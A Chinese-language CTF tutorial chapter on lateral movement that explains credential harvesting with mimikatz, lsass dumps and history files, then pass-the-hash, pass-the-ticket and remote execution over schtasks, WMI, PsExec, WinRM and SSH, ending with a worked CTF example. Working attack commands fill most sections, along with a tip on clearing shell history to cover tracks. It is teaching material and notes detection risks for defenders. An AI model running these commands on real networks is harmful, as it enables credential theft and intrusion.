---
comments: true
---

# 横向移动

## 什么是横向移动

拿下边界上的一台机器（比如通过 [RCE](./rce.md) 或 webshell）只是第一步。这台机器往往不在核心网段，flag 也不在它的 `/flag` 里。所谓 **横向移动（Lateral Movement）**，就是以这台已控主机为跳板，利用凭据、协议和内网信任关系，去控制同网段或同域内的其他主机。

横向移动的核心逻辑只有一句话：**你不知道目标机器的漏洞，但你可能知道它的"钥匙"**。钥匙从哪里来？从你手上这台机器的内存、磁盘和历史记录里来。所以横向移动的完整流程是：

1. 在当前主机上 **收集凭据**（密码哈希、Kerberos 票据、私钥、配置文件里的明文口令）；
2. 用收集到的凭据 **通过某种通道登录目标主机**（SMB、WinRM、SSH、WMI、计划任务……）；
3. 在新主机上重复 1–2，直到摸到放着 flag 的那台。

本章按"收集 → 传递 → 通道"的顺序，讲清每种方法的原理、最小可用命令、适用条件和检测风险。Windows 侧是重点（域环境是横向移动的主战场），Linux 侧单独说明。

## 凭据收集

### Windows：mimikatz 与 lsass

Windows 为了方便用户免重复登录，会把登录凭据缓存在 **LSASS 进程（`lsass.exe`）**的内存里，包括明文密码（旧系统或开了 WDigest 时）、NTLM 哈希和 Kerberos 票据。** mimikatz** 就是读取这些缓存的经典工具。

前提条件：需要 **本地管理员或 SYSTEM 权限**，并且拥有 `SeDebugPrivilege`（管理员默认有）。

```powershell
# 在目标机器上执行（需管理员权限的 shell）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

典型输出中关注这些字段：

```text
Authentication Id : 0 ; 123456
User Name         : Administrator
Domain            : WORKGROUP
        * Password : P@ssw0rd123        # 明文（新版本 Windows 常抓不到）
        * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
        * SHA1     : ...
```

如果目标禁止直接跑 mimikatz（杀软拦截），可以换个思路：把 lsass 内存转储下来，带回自己机器离线分析：

```powershell
# 方法1：用系统自带的 comsvcs.dll（免上传工具，白名单利用）
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass的PID> C:\temp\lsass.dmp full

# 方法2：任务管理器 → 找到 lsass.exe → 右键"创建转储文件"
```

然后在自己机器上：

```bash
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" "exit"
```

> 适用条件：有管理员/SYSTEM 权限且能读 lsass（未启用 LSA Protection / Credential Guard）。
> 检测风险：极高——读 lsass 是 EDR 的重点监控行为，`sekurlsa::logonpasswords` 的特征码人尽皆知。

### Windows：配置文件与浏览器凭据

不是每台机器都需要动用 mimikatz。管理员图省事，经常把凭据留在磁盘上，CTF 里尤其爱考：

- **unattend 应答文件**：`C:\Windows\Panther\Unattend.xml`、`sysprep.inf`，装机脚本里常残留明文管理员密码；
- **组策略首选项（GPP）**：域控共享目录 `\\域控\SYSVOL\...\Groups.xml` 里的 `cpassword` 字段，密钥已被微软公开，等于明文；
- **各种服务的配置文件**：如 `web.config`（数据库连接串）、`Tomcat` 的 `tomcat-users.xml`、各类 `*.ini`；
- **浏览器凭据**：Chrome 的 `Login Data`（SQLite 库，密码用 DPAPI 加密），可用 HackBrowserData 一键导出本机所有浏览器的密码、Cookie、历史记录。

```powershell
# 搜索常见的密码残留
dir /s /b C:\unattend.xml C:\sysprep.inf 2>nul
findstr /si "password" C:\Windows\Panther\*.xml
```

> 适用条件：只要能读文件即可，不需要高权限（浏览器凭据导出当前用户的即可）。
> 检测风险：低——读文件几乎是正常行为，但批量翻敏感目录可能引起 DLP 注意。

### Linux：history、密钥与配置

Linux 侧没有 lsass，但凭据同样散落各处：

```bash
# 1. 命令历史：管理员可能在命令行里直接敲过密码
cat ~/.bash_history
history | grep -Ei "ssh|mysql|passwd|sudo"

# 2. SSH 私钥与已知主机：拿到私钥就能免密横移
ls -la ~/.ssh/
cat ~/.ssh/id_rsa ~/.ssh/known_hosts

# 3. 应用配置：数据库口令往往是突破口
grep -rEi "passw|pwd" /var/www/html/ --include="*.php" | head
cat /etc/mysql/debian.cnf 2>/dev/null

# 4. 其他常见位置
cat ~/.netrc 2>/dev/null          # ftp/curl 自动登录凭据
sudo -l                           # 顺带看看 sudo 权限，判断能不能提权
```

一个常见误区：管理员在所有机器上用同一把 `id_rsa` 或同一个密码。所以拿到一台机器的任何凭据，都值得一试"密码喷洒"——拿它去试网段里所有机器的 22/3389/5985 端口。

> 适用条件：读文件权限即可。
> 检测风险：低，但注意你执行的每条命令也会写进 history，记得 `unset HISTFILE` 或事后清理。

## PTH：哈希传递

### 原理

Windows 的 NTLM 认证（准确说是 NTLMv2 挑战-响应）**不要求客户端提供明文密码**。过程简化如下：

1. 服务器发一个随机 challenge；
2. 客户端用 `HMAC(NTLM哈希, challenge + 用户信息)` 计算响应；
3. 服务器用本地（或域控上的）同一个 NTLM 哈希验证响应。

也就是说，**真正参与运算的是 NTLM 哈希，明文密码只是用来推导哈希的原料**。只要拿到哈希，就能冒充这个用户——这就是 Pass The Hash（哈希传递）。新版 Windows 抓不到明文密码不要紧，哈希照样能用。

### 常用命令

以 impacket 套件（Kali 自带）和 CrackMapExec / NetExec 为例，假设拿到管理员哈希 `31d6cfe0d16ae931b73c59d7e0c089c0`（这是空密码的哈希，仅示例）：

```bash
# 用哈希直接获得目标的 SYSTEM shell（wmiexec 不回显文件落地，较安静）
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10

# psexec 风格：会上传服务程序，功能全但动静大
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.1.10

# 批量验证：拿一个哈希试整个网段（密码喷洒）
nxc smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

Windows 攻击机上则可用 mimikatz 把哈希注入当前会话，之后 `dir \\目标\C$` 等操作都会以该用户身份认证：

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:WORKGROUP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0" "exit"
```

> 适用条件：目标开放 445（SMB）或 135（WMI）；账号是有权登录的管理员账号；**本地管理员哈希不能用于横移**（KB2871997 后除 RID 500 的 Administrator 外，本地账号远程 UAC 会拦），域账号不受此限。
> 检测风险：中高——会产生 NTLM 类型 3 登录日志（事件 ID 4624，登录类型 3），psexec 类还会创建服务（事件 ID 7045），很容易关联。

## PTT：票据传递

### 与 Kerberos 认证的衔接

PTH 用的是 NTLM 协议，而在域环境里，主流认证协议是 **Kerberos**。如果你对 Kerberos 的"AS 发 TGT → 拿 TGT 换 ST → 拿 ST 访问服务"这套流程还不熟，建议先读「域渗透入门」一章的 Kerberos 部分，这里只回顾关键结论：

- 客户端向 KDC（域控）证明自己的身份后，拿到 **TGT**（入场券）；
- 访问具体服务（如某台机器的 CIFS）时，用 TGT 换 **ST**（服务票据）；
- 服务端只看票据本身，**不再问你要密码**。

**Pass The Ticket** 的思路因此很直白：既然服务端只认票据，那把别人机器上缓存的票据偷出来、注入自己的会话，就能以那个用户的身份访问对应服务，全程不需要密码，也不需要哈希。

### 操作流程

```powershell
# 1. 在被控机器上导出内存中的所有票据（需要管理员权限）
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
# 会生成一堆 [0;xxxxx]-x-x-xxxxxxx-user@DOMAIN.kirbi 文件

# 2. 把目标用户的 TGT 注入自己的会话
mimikatz.exe "kerberos::ptt [0;12345]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi" "exit"

# 3. 验证：现在访问域内服务用的就是票据里那个用户的身份
klist
dir \\dc01.domain.local\C$
```

Linux 攻击机上也可用 impacket 配合 `.ccache` 票据缓存，通过 `KRB5CCNAME` 环境变量指定票据后执行 `impacket-psexec -k -no-pass` 等命令。

> 适用条件：能拿到票据缓存（同样需要管理员权限读 lsass），票据未过期（TGT 默认 10 小时）；目标服务走 Kerberos 认证。
> 检测风险：中——不产生向 KDC 的异常认证请求（票据是偷来的合法票据），但可用票据生命周期异常、账户从陌生 IP 访问等特征检测；黄金/白银票据这类伪造票据则会在域控日志里留下缺失的 AS/TGS 请求痕迹。

## 计划任务与 WMI：schtasks / wmic / PsExec

有了凭据（明文、哈希或票据），还需要一个"通道"把命令送上去执行。最经典的三件套：

### schtasks：远程计划任务

```cmd
:: 以收集到的凭据在目标上创建计划任务并立即触发
schtasks /create /s 192.168.1.10 /u DOMAIN\Administrator /p "P@ssw0rd123" ^
  /tn "update" /tr "cmd.exe /c whoami > C:\temp\out.txt" /sc once /st 23:59 /ru SYSTEM
schtasks /run /s 192.168.1.10 /u DOMAIN\Administrator /p "P@ssw0rd123" /tn "update"
type \\192.168.1.10\C$\temp\out.txt
schtasks /delete /s 192.168.1.10 /u DOMAIN\Administrator /p "P@ssw0rd123" /tn "update" /f
```

> 适用条件：目标开 445，账号是目标的管理员。
> 检测风险：高——创建/运行/删除计划任务会产生事件 ID 4698/4702/4699 及任务调度器日志，痕迹清晰，记得清理任务和输出文件。

### wmic / WMI

```cmd
:: 一行命令远程执行，不落盘服务程序
wmic /node:192.168.1.10 /user:DOMAIN\Administrator /password:"P@ssw0rd123" ^
  process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

wmic 在新系统上已被弃用，可用 PowerShell 的 `Invoke-CimMethod -ComputerName` 或前面 impacket-wmiexec 达到同样效果。WMI 不回显，需要把结果写到文件再从共享目录取回（或用 C2 工具封装好的模块）。

> 适用条件：目标开 135 端口（WMI/RPC）和管理员共享，账号有管理员权限。
> 检测风险：中高——WMI 进程由 `WmiPrvSE.exe` 拉起，父子进程关系异常是 EDR 常见检测点，但无服务落地，比 PsExec 安静。

### PsExec 类

PsExec 的原理：上传一个服务程序到 `ADMIN$` 共享 → 远程创建并启动服务 → 通过命名管道回传交互式 shell。impacket-psexec、Metasploit 的 psexec 模块都是同一思路。

```bash
impacket-psexec DOMAIN/Administrator:P@ssw0rd123@192.168.1.10
```

> 适用条件：445 开、ADMIN$ 可写、管理员权限——条件最多，但换来一个稳定的交互式 SYSTEM shell。
> 检测风险：极高——服务安装（7045）、命名管道特征、落地的 exe，几乎是 EDR 教科书式告警。

## WinRM / SSH：正规管理通道

前面的方法多少带点"非常规"。而 WinRM 和 SSH 本身就是管理员日常运维用的正规通道——用正规通道横移，流量最像正常管理行为。

### WinRM（Windows 的 SSH）

WinRM 走 5985（HTTP）/ 5986（HTTPS），如果管理员开了它，`evil-winrm` 是最顺手的客户端：

```bash
# 明文密码登录
evil-winrm -i 192.168.1.10 -u Administrator -p 'P@ssw0rd123'

# 也支持 PTH
evil-winrm -i 192.168.1.10 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

登录后是 PowerShell 会话，自带 `upload` / `download` / `menu` 等便捷功能。

> 适用条件：目标开启 WinRM（5985/5986 可通），账号在目标的 `Remote Management Users` 组或为管理员。
> 检测风险：中——协议本身合法，告警主要依赖登录源 IP、账号行为基线等异常分析；日志在 `Microsoft-Windows-WinRM/Operational`。

### SSH（Linux 横移主力）

Linux 内网横移基本就是 SSH 的天下，配合前面收集到的私钥或口令：

```bash
# 用收集到的私钥登录
chmod 600 id_rsa
ssh -i id_rsa user@192.168.1.20

# 密码登录
sshpass -p 'P@ssw0rd123' ssh user@192.168.1.20

# 跳板：通过已控的边界机访问不出网的目标
ssh -J user@边界机IP user@192.168.1.20
```

> 适用条件：22 端口可达，有口令或私钥；密钥没有 passphrase（否则还得再爆破一次）。
> 检测风险：低到中——SSH 是日常通道，但 `known_hosts` 里没有的新主机互连、非常用账号登录仍是常见审计点，日志在 `/var/log/auth.log`。

### 通道选择速查

| 方法 | 端口 | 凭据形态 | 检测风险一句话 |
| --- | --- | --- | --- |
| wmiexec | 135/445 | 明文/哈希 | 无落盘但父子进程异常，中 |
| PsExec | 445 | 明文/哈希 | 服务安装+落地文件，最高 |
| schtasks | 445 | 明文/哈希 | 计划任务日志链完整，高 |
| WinRM | 5985/5986 | 明文/哈希/票据 | 合法协议靠行为分析，中 |
| SSH | 22 | 口令/私钥 | 日常通道，最低 |

## 典型例题：从 webshell 到内网 flag

下面用一道典型的多层内网 CTF 场景把整章串起来。场景设定：

- 边界 Web 机 `10.10.1.10`（Linux + PHP）存在文件上传漏洞；
- 内网有一台 Windows 主机 `192.168.1.10`，flag 在其 `C:\flag.txt`；
- Web 机双网卡，能通内网。

**第一步：拿到立足点。** 用「文件上传」章的方法上传一个 PHP 一句话，蚁剑连上，发现 Web 机是 `www-data` 权限。

**第二步：提权并收集凭据。** 通过内核漏洞或 sudo 配置问题提到 root 后（提权细节超出本章范围），开始按本章的方法翻凭据：

```bash
cat /root/.bash_history
# 输出里发现：
# sshpass -p 'Admin2024!' ssh administrator@192.168.1.10

cat /root/.ssh/id_rsa
# 发现一把私钥，known_hosts 里有 192.168.1.10
```

history 里那条命令直接泄露了 Windows 主机的 administrator 密码——这是 CTF 里最常见的出题方式：凭据就放在 history、配置文件、私钥这三个地方。

**第三步：探测目标通道。** 在 Web 机上扫一下内网：

```bash
# 简单探测（无 nmap 时可用 /dev/tcp）
for p in 445 5985 22; do
  (echo > /dev/tcp/192.168.1.10/$p) 2>/dev/null && echo "$p open"
done
# 445 open
# 5985 open
```

**第四步：横向移动拿 flag。** 445 和 5985 都开，优先用 WinRM 这个最安静的通道。Web 机上没有 evil-winrm，可以用 impacket：

```bash
# 通过 Web 机做跳板（或直接在上面装 impacket）
impacket-wmiexec 'Administrator:Admin2024!@192.168.1.10'
```

拿到 SYSTEM shell 后：

```cmd
type C:\flag.txt
:: flag{1ateral_m0vement_fr0m_h1st0ry}
```

如果题目只开了 445 而管理员密码换了，就退回第二步：在 Web 机或第一台 Windows 上用 mimikatz 抓哈希，改走 PTH（`impacket-wmiexec -hashes`）；如果是域环境、抓到了票据，则走 PTT。解题的决策链永远是：**先翻凭据，再看端口，最后按"安静程度"从 WinRM/SSH → WMI → schtasks → PsExec 的顺序选通道**。

## 小结

- 横向移动 = 收集凭据 + 选择通道，凭据是核心资产；
- Windows 凭据看 lsass（mimikatz）、配置文件、浏览器；Linux 看 history、`~/.ssh`、应用配置；
- PTH 利用 NTLM 认证只验哈希的特点；PTT 直接复用 Kerberos 票据，与「域渗透入门」的 Kerberos 知识衔接；
- 通道按安静程度排序：SSH/WinRM < WMI < schtasks < PsExec；做题时反过来，哪个通用哪个；
- 每种方法都记住两件事：**适用条件**（端口、权限、凭据形态）和 **检测风险**（日志、服务、进程痕迹）——实战里前者决定能不能用，后者决定能用多久。
